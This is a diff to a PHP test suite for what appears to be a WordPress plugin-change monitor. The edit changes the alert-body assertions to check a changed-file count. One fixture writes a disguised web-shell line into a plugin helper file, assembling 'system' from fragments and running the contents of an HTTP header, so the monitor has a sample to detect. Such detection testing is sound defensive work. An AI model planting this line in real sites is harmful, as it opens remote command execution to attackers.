@@ -205,7 +205,7 @@ t('Monitor: an unverified plugin update alerts once, stays held until accepted, 
     bump($root, 'wp-content/plugins/premium/inc/helper.php', '<?php function helper() {} $f = "sys" . "tem"; $f($_SERVER["HTTP_X"] ?? "");');
     assertSame(1, $m->run('check')['exit']);
     assertSame(2, count($n->sent), 'a further change while pending must alert again');
-    assertContains('inc/helper.php', $n->sent[1]['body']);
+    assertContains('2 changed file(s)', $n->sent[1]['body']); // the files themselves are in the report
 
     // Reviewed and accepted: quiet afterwards, version advanced.
     $r = Sentinel\Accept::run($config, $state, ['wp-content/plugins/premium'], false, []);
@@ -286,7 +286,7 @@ t('Monitor: with auto-accept, an update arriving with a detection in the same pl
     bump($root, 'wp-content/plugins/foo/inc/helper.php', "<?php // helper, quietly edited\n");
     assertSame(1, $m->run('check')['exit']);
     assertTrue(count($n->sent) > $before);
-    assertContains('inc/helper.php', $n->sent[count($n->sent) - 1]['body']);
+    assertContains('2 changed file(s)', $n->sent[count($n->sent) - 1]['body']); // the files themselves are in the report
 
     // Reviewed and accepted: the update is recorded, and the next quiet edit is not part of it.
     assertTrue(isset((new \Sentinel\Detections($state))->all()['wp-content/plugins/foo/evil.php']), 'the detection is remembered until then');
